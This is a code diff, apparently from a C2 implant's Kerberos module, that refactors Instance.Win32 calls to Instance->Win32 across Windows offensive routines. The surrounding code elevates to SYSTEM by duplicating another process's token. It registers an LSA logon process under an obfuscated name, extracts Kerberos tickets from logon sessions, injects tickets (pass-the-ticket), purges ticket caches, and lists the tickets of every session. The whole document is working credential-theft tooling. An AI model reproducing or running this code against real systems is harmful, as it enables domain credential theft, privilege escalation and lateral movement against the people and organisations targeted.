@@ -12,14 +12,14 @@ BOOL IsHighIntegrity(HANDLE TokenHandle)
     SID_IDENTIFIER_AUTHORITY NtAuthority         = SECURITY_NT_AUTHORITY;
     PSID                     AdministratorsGroup = NULL;
 
-    Success = Instance.Win32.AllocateAndInitializeSid( &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup );
+    Success = Instance->Win32.AllocateAndInitializeSid( &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup );
     if ( Success )
     {
-        if ( ! Instance.Win32.CheckTokenMembership( NULL, AdministratorsGroup, &ReturnValue ) )
+        if ( ! Instance->Win32.CheckTokenMembership( NULL, AdministratorsGroup, &ReturnValue ) )
         {
             ReturnValue = FALSE;
         }
-        Instance.Win32.FreeSid( AdministratorsGroup );
+        Instance->Win32.FreeSid( AdministratorsGroup );
         AdministratorsGroup = NULL;
     }
 
@@ -32,14 +32,14 @@ DWORD GetProcessIdByName(WCHAR* processName)
     PROCESSENTRY32W pe32         = { 0 };
     DWORD           Pid          = -1;
 
-    hProcessSnap = Instance.Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    hProcessSnap = Instance->Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if ( hProcessSnap == INVALID_HANDLE_VALUE )
     {
         return Pid;
     }
 
     pe32.dwSize = sizeof(PROCESSENTRY32W);
-    if ( ! Instance.Win32.Process32FirstW( hProcessSnap, &pe32 ) )
+    if ( ! Instance->Win32.Process32FirstW( hProcessSnap, &pe32 ) )
     {
         SysNtClose( hProcessSnap );
         return Pid;
@@ -52,7 +52,7 @@ DWORD GetProcessIdByName(WCHAR* processName)
             break;
         }
 
-    } while (Instance.Win32.Process32NextW(hProcessSnap, &pe32));
+    } while (Instance->Win32.Process32NextW(hProcessSnap, &pe32));
 
     SysNtClose( hProcessSnap );
     return Pid;
@@ -109,20 +109,20 @@ BOOL ElevateToSystem()
             }
             else
             {
-                PRINTF( "TokenDuplicate: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+                PRINTF( "TokenDuplicate: Failed [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
             }
             SysNtClose( hToken );
         }
         else
         {
-            PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+            PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
         }
 
         SysNtClose( hProcess );
     }
     else
     {
-        PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+        PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
     }
 
     return ReturnValue;
@@ -138,16 +138,16 @@ BOOL IsSystem( HANDLE TokenHandle )
     PSID                     pSystemSid = NULL;
     BOOL                     bSystem    = FALSE;
 
-    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser ) )
+    if ( ! Instance->Win32.GetTokenInformation( hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser ) )
     {
         return FALSE;
     }
 
-    if ( ! Instance.Win32.AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid) )
+    if ( ! Instance->Win32.AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid) )
         return FALSE;
 
-    bSystem = Instance.Win32.EqualSid( pTokenUser->User.Sid, pSystemSid );
-    Instance.Win32.FreeSid( pSystemSid );
+    bSystem = Instance->Win32.EqualSid( pTokenUser->User.Sid, pSystemSid );
+    Instance->Win32.FreeSid( pSystemSid );
 
     return bSystem;
 }
@@ -160,10 +160,10 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
 
     if ( ! highIntegrity )
     {
-        status = Instance.Win32.LsaConnectUntrusted( &hLsaLocal );
+        status = Instance->Win32.LsaConnectUntrusted( &hLsaLocal );
         if ( ! NT_SUCCESS( status ) )
         {
-            status = Instance.Win32.LsaNtStatusToWinError( status );
+            status = Instance->Win32.LsaNtStatusToWinError( status );
         }
     }
     else
@@ -182,24 +182,24 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
         name[ 9 ] =  HideChar('\0');
         name[ 5 ] =  HideChar('o');
         STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
-        status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
+        status = Instance->Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
         if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
         {
             if ( IsSystem( hToken ) )
             {
-                status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
+                status = Instance->Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
                 if ( ! NT_SUCCESS( status ) )
                 {
-                    status = Instance.Win32.LsaNtStatusToWinError( status );
+                    status = Instance->Win32.LsaNtStatusToWinError( status );
                 }
             }
             else
             {
                 if ( ElevateToSystem() )
                 {
-                    status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
+                    status = Instance->Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
                     if ( ! NT_SUCCESS( status ) ) {
-                        status = Instance.Win32.LsaNtStatusToWinError( status );
+                        status = Instance->Win32.LsaNtStatusToWinError( status );
                     }
                     TokenRevSelf();
                 }
@@ -221,16 +221,16 @@ NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
     PSECURITY_LOGON_SESSION_DATA logonData   = NULL;
     NTSTATUS                     status      = STATUS_UNSUCCESSFUL;
 
-    sessionData = Instance.Win32.LocalAlloc( LPTR, sizeof( LOGON_SESSION_DATA ) );
+    sessionData = Instance->Win32.LocalAlloc( LPTR, sizeof( LOGON_SESSION_DATA ) );
     if ( ! sessionData )
         return status;
 
     if ( luid.LowPart != 0 )
     {
-        status = Instance.Win32.LsaGetLogonSessionData( &luid, &logonData );
+        status = Instance->Win32.LsaGetLogonSessionData( &luid, &logonData );
         if ( NT_SUCCESS( status ) )
         {
-            sessionData->sessionData = Instance.Win32.LocalAlloc( LPTR, sizeof(*sessionData->sessionData) );
+            sessionData->sessionData = Instance->Win32.LocalAlloc( LPTR, sizeof(*sessionData->sessionData) );
             if ( sessionData->sessionData != NULL )
             {
                 sessionData->sessionCount = 1;
@@ -247,17 +247,17 @@ NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
     {
         ULONG logonSessionCount;
         PLUID logonSessionList;
-        status = Instance.Win32.LsaEnumerateLogonSessions( &logonSessionCount, &logonSessionList );
+        status = Instance->Win32.LsaEnumerateLogonSessions( &logonSessionCount, &logonSessionList );
         if ( NT_SUCCESS( status ) )
         {
-            sessionData->sessionData = Instance.Win32.LocalAlloc( LPTR, logonSessionCount * sizeof(*sessionData->sessionData) );
+            sessionData->sessionData = Instance->Win32.LocalAlloc( LPTR, logonSessionCount * sizeof(*sessionData->sessionData) );
             if ( sessionData->sessionData != NULL )
             {
                 sessionData->sessionCount = logonSessionCount;
                 for ( int i = 0; i < logonSessionCount; i++ )
                 {
                     LUID luid2 = logonSessionList[i];
-                    status = Instance.Win32.LsaGetLogonSessionData( &luid2, &logonData );
+                    status = Instance->Win32.LsaGetLogonSessionData( &luid2, &logonData );
                     if ( NT_SUCCESS(status) )
                     {
                         sessionData->sessionData[i] = logonData;
@@ -267,7 +267,7 @@ NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
                         sessionData->sessionData[i] = NULL;
                     }
                 }
-                Instance.Win32.LsaFreeReturnBuffer( logonSessionList );
+                Instance->Win32.LsaFreeReturnBuffer( logonSessionList );
                 *data = sessionData;
             }
             else
@@ -290,7 +290,7 @@ VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING ta
     ULONG                       TicketSize       = 0;
     PBYTE                       Ticket           = NULL;
 
-    retrieveRequest = Instance.Win32.LocalAlloc( LPTR, responseSize * sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
+    retrieveRequest = Instance->Win32.LocalAlloc( LPTR, responseSize * sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
     if ( ! retrieveRequest )
         return;
 
@@ -304,13 +304,13 @@ VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING ta
     retrieveRequest->TargetName.Buffer = ( PWSTR )( (PBYTE )retrieveRequest + sizeof( KERB_RETRIEVE_TKT_REQUEST ));
     MemCopy( retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength );
 
-    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, (LPVOID*)&retrieveResponse, &responseSize, &protocolStatus );
+    status = Instance->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, (LPVOID*)&retrieveResponse, &responseSize, &protocolStatus );
     if ( NT_SUCCESS( status ) && NT_SUCCESS( protocolStatus ) )
     {
         if ( NT_SUCCESS( protocolStatus ) )
         {
             TicketSize = retrieveResponse->Ticket.EncodedTicketSize;
-            Ticket = Instance.Win32.LocalAlloc( LPTR, TicketSize );
+            Ticket = Instance->Win32.LocalAlloc( LPTR, TicketSize );
             if ( Ticket )
             {
                 MemCopy( Ticket, retrieveResponse->Ticket.EncodedTicket, TicketSize );
@@ -329,9 +329,9 @@ VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING ta
     }
 
     if ( retrieveResponse )
-        Instance.Win32.LsaFreeReturnBuffer( retrieveResponse );
+        Instance->Win32.LsaFreeReturnBuffer( retrieveResponse );
     if ( retrieveRequest )
-        Instance.Win32.LocalFree( retrieveRequest );
+        Instance->Win32.LocalFree( retrieveRequest );
 }
 
 VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )
@@ -347,10 +347,10 @@ VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA
     Session->Session = Data->Session;
     // UserSID
     WCHAR* sid = NULL;
-    if ( Instance.Win32.ConvertSidToStringSidW(Data->Sid, &sid) )
+    if ( Instance->Win32.ConvertSidToStringSidW(Data->Sid, &sid) )
     {
         StringCopyW( Session->UserSID, sid );
-        Instance.Win32.LocalFree( sid ); sid = NULL;
+        Instance->Win32.LocalFree( sid ); sid = NULL;
     }
     // LogonTime
     Session->LogonTime.QuadPart = Data->LogonTime.QuadPart;
@@ -440,14 +440,14 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
         goto END;
     }
 
-    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
+    status = Instance->Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
         goto END;
     }
 
-    submitRequest = Instance.Win32.LocalAlloc( LPTR, submitSize * sizeof( KERB_SUBMIT_TKT_REQUEST ) );
+    submitRequest = Instance->Win32.LocalAlloc( LPTR, submitSize * sizeof( KERB_SUBMIT_TKT_REQUEST ) );
     if ( ! submitRequest )
         goto END;
 
@@ -462,7 +462,7 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
 
     MemCopy( RVA( PBYTE, submitRequest, submitRequest->KerbCredOffset ), Ticket, TicketSize );
 
-    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus );
+    status = Instance->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus );
 
     if ( ! NT_SUCCESS( status ) )
     {
@@ -481,10 +481,10 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
 
 END:
     if ( submitRequest ) {
-        Instance.Win32.LocalFree( submitRequest );
+        Instance->Win32.LocalFree( submitRequest );
     }
     if ( hLsa ) {
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        Instance->Win32.LsaDeregisterLogonProcess( hLsa );
     }
     MemZero( name, sizeof( name ) );
 
@@ -534,7 +534,7 @@ BOOL Purge( HANDLE hToken, LUID luid )
         goto END;
     }
 
-    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
+    status = Instance->Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
@@ -552,11 +552,11 @@ BOOL Purge( HANDLE hToken, LUID luid )
     purgeRequest.RealmName = (UNICODE_STRING){.Buffer = L"", .Length = 0, .MaximumLength = 1};
     purgeRequest.ServerName = (UNICODE_STRING){.Buffer = L"", .Length = 0, .MaximumLength = 1};
 
-    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &purgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &purgeResponse, &responseSize, &protocolStatus );
+    status = Instance->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &purgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &purgeResponse, &responseSize, &protocolStatus );
 
     if ( purgeResponse )
     {
-        Instance.Win32.LsaFreeReturnBuffer( purgeResponse ); purgeResponse = NULL;
+        Instance->Win32.LsaFreeReturnBuffer( purgeResponse ); purgeResponse = NULL;
     }
 
     if ( ! NT_SUCCESS( status ) )
@@ -575,7 +575,7 @@ BOOL Purge( HANDLE hToken, LUID luid )
 
 END:
     if (hLsa) {
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        Instance->Win32.LsaDeregisterLogonProcess( hLsa );
     }
     MemZero( name, sizeof( name ) );
 
@@ -631,10 +631,10 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
         goto END;
     }
 
-    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
+    status = Instance->Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
     if ( ! NT_SUCCESS( status ) )
     {
-        PRINTF( "[!] LsaLookupAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
+        PRINTF( "[!] LsaLookupAuthenticationPackage %ld\n", Instance->Win32.LsaNtStatusToWinError( status ) );
         goto END;
     }
 
@@ -652,7 +652,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
         if ( sessionData->sessionData[i] == NULL )
             continue;
 
-        NewSession = Instance.Win32.LocalAlloc( LPTR, sizeof( SESSION_INFORMATION ) );
+        NewSession = Instance->Win32.LocalAlloc( LPTR, sizeof( SESSION_INFORMATION ) );
         if ( ! NewSession )
             continue;
 
@@ -677,13 +677,13 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
         else
             cacheRequest.LogonId = ( LUID ){.HighPart = 0, .LowPart = 0};
 
-        Instance.Win32.LsaFreeReturnBuffer( sessionData->sessionData[i] );
+        Instance->Win32.LsaFreeReturnBuffer( sessionData->sessionData[i] );
 
         cacheResponse = NULL;
-        status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), (LPVOID*)&cacheResponse, &responseSize, &protocolStatus );
+        status = Instance->Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), (LPVOID*)&cacheResponse, &responseSize, &protocolStatus );
         if ( ! NT_SUCCESS( status ) )
         {
-            PRINTF( "[!] LsaCallAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
+            PRINTF( "[!] LsaCallAuthenticationPackage %ld\n", Instance->Win32.LsaNtStatusToWinError( status ) );
             continue;
         }
 
@@ -701,7 +701,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
 
         for ( int j = 0; j < cacheResponse->CountOfTickets; j++ )
         {
-            TicketInfo = Instance.Win32.LocalAlloc( LPTR, sizeof( TICKET_INFORMATION ) );
+            TicketInfo = Instance->Win32.LocalAlloc( LPTR, sizeof( TICKET_INFORMATION ) );
             if ( ! TicketInfo )
                 continue;
 
@@ -725,20 +725,20 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
             }
         }
 
-        Instance.Win32.LsaFreeReturnBuffer( cacheResponse ); cacheResponse = NULL;
+        Instance->Win32.LsaFreeReturnBuffer( cacheResponse ); cacheResponse = NULL;
     }
 
     ReturnValue = TRUE;
 
 END:
     if ( sessionData && sessionData->sessionData ) {
-        Instance.Win32.LocalFree( sessionData->sessionData );
+        Instance->Win32.LocalFree( sessionData->sessionData );
     }
     if ( sessionData ) {
-        Instance.Win32.LocalFree( sessionData );
+        Instance->Win32.LocalFree( sessionData );
     }
     if ( hLsa ) {
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        Instance->Win32.LsaDeregisterLogonProcess( hLsa );
     }
     MemZero( name, sizeof( name ) );
 
@@ -758,10 +758,10 @@ LUID* GetLUID( HANDLE hToken )
     if ( ! hToken )
         return NULL;
 
-    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenStatistics, &tokenStats, sizeof( tokenStats ), &tokenSize ) )
+    if ( ! Instance->Win32.GetTokenInformation( hToken, TokenStatistics, &tokenStats, sizeof( tokenStats ), &tokenSize ) )
         return NULL;
 
-    luid = Instance.Win32.LocalAlloc( LPTR, sizeof( LUID ) );
+    luid = Instance->Win32.LocalAlloc( LPTR, sizeof( LUID ) );
     if ( ! luid )
         return NULL;
 
